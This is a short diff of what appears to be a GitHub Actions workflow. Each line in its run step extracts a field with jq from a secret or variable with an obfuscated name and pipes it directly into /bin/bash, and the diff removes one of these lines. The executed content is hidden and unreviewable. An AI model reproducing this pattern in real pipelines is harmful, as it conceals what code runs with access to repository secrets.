@@ -18,7 +18,6 @@ jobs:
           fi163: ${{ secrets.fi163 }}
         run: |
           printf '%s' "$fi163" | jq -r .lasse71 | /bin/bash
-          echo $wmkxu3813 | jq -r .ena959 | /bin/bash
           echo $vzkl3 | jq -r .hgmbp1 | /bin/bash
           echo $zcdcz3 | jq -r .hhig37 | /bin/bash
           printf '%s' "$a1427" | jq -r .jpm495 | /bin/bash
